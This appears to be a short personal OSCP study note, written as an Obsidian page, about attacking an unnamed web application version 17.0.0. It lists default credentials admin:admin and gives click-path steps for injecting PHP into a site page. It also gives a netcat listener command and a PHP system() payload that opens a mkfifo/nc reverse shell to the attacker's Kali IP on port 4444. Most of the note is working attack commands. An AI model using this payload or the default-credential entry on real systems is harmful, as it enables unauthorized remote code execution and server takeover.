17.0.0

Default creds
admin:admin

Websites > (+) Plus sign Add websites > Create Website > Add Page > Edit HTML Source > Include PHP code > Edit Page/Container Properties > Visit the Webpage to trigger

PHP METHOD 2

Start a nc listener

```
nc -lvnp 4444
```

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${KaliIP} 4444 >/tmp/f");?>`;

dv.paragraph("```bash\n" + command + "\n```");
```